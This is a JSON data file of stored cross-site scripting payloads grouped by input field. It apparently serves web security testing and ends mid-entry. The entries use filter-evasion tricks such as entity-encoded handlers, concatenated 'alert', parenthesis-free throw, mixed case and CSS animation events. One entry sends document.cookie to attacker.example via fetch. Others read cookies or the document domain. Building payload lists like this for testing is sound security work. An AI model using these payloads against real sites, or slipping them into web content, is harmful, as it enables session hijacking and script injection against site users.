{
  "xss_wr_subject": {
    "xss_subject": [
      {
        "type": "STORED_XSS",
        "family": "entity_onerror",
        "payload": "<img src=x onerror=&#97;lert(1)>"
      },
      {
        "type": "STORED_XSS",
        "family": "string_concat",
        "payload": "<img src=x onerror=window['ale'+'rt'](1)>"
      },
      {
        "type": "STORED_XSS",
        "family": "no_paren_throw",
        "payload": "<svg onload=\"onerror=alert;throw 1\">"
      },
      {
        "type": "STORED_XSS",
        "family": "no_paren_comma",
        "payload": "<script>throw onerror=alert,1</script>"
      },
      {
        "type": "STORED_XSS",
        "family": "tab_sep",
        "payload": "<img\tsrc=x\tonerror=alert(1)>"
      },
      {
        "type": "STORED_XSS",
        "family": "mixed_case",
        "payload": "<ImG sRc=x OnErRoR=alert(1)>"
      },
      {
        "type": "STORED_XSS",
        "family": "css_animation",
        "payload": "<style>@keyframes x{}</style><p style=\"animation-name:x\" onanimationstart=alert(1)>"
      }
    ]
  },
  "xss_wr_content": {
    "xss_content": [
      {
        "type": "STORED_XSS",
        "family": "entity_onerror_cookie",
        "payload": "<img src=x onerror=&#97;lert(document.cookie)>"
      },
      {
        "type": "STORED_XSS",
        "family": "string_concat_onerror",
        "payload": "<img src=x onerror=window['ale'+'rt'](1)>"
      },
      {
        "type": "STORED_XSS",
        "family": "no_paren_img",
        "payload": "<img src=x onerror=\"onerror=alert;throw 1\">"
      },
      {
        "type": "STORED_XSS",
        "family": "iframe_encoded_srcdoc",
        "payload": "<iframe srcdoc=\"&#60;script&#62;alert(1)&#60;/script&#62;\">"
      },
      {
        "type": "STORED_XSS",
        "family": "svg_entity_script",
        "payload": "<svg><script>alert&lpar;1&rpar;</script></svg>"
      },
      {
        "type": "STORED_XSS",
        "family": "video_source_onerror",
        "payload": "<video><source onerror=\"alert(document.domain)\"></video>"
      },
      {
        "type": "STORED_XSS",
        "family": "fetch_cookie_onerror",
        "payload": "<img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>"
      }
    ]
  },
  "xss_search_stx": {
    "xss_search": [
      {
        "type": "REFLECTED_XSS",
